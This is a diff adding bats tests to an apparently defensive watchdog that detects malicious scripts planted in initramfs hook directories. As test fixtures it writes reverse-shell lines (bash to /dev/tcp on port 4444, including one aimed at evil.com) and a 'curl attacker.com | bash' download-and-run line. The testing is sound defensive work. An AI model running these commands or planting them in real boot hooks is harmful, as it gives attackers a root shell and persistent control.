@@ -186,3 +186,53 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-initramfs-hooks -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): initramfs-hooks-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    # T1542/T1546 early-boot root exec persistence — injection alert
+    # MUST persist across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/cryptroot"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"initramfs_hooks_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    # initramfs hook scripts are /bin/sh; # comments. Operator notes
+    # about hypothetical attack patterns must NOT trigger alert.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\n# cryptroot\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\necho "copy crypto bits"\n' > "${HOOKD}/cryptroot"
+    run_wd
+    ! cap | grep -q '"event":"initramfs_hooks_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /etc/initramfs-tools/hooks + /usr/share/initramfs-tools/hooks axes — injection in ANY → alert)" {
+    # initramfs-tools sources from BOTH /etc + /usr/share dirs.
+    # Attacker may plant in either. Lock multi-dir axis.
+    HOOKD2="${TMP}/share-hooks"; mkdir -p "${HOOKD2}"
+    seed_benign
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant injection in second dir.
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-hook"
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    # curl | bash is a common bootstrap variant. Lock detection of
+    # the bash suffix in addition to sh.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/cryptroot"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
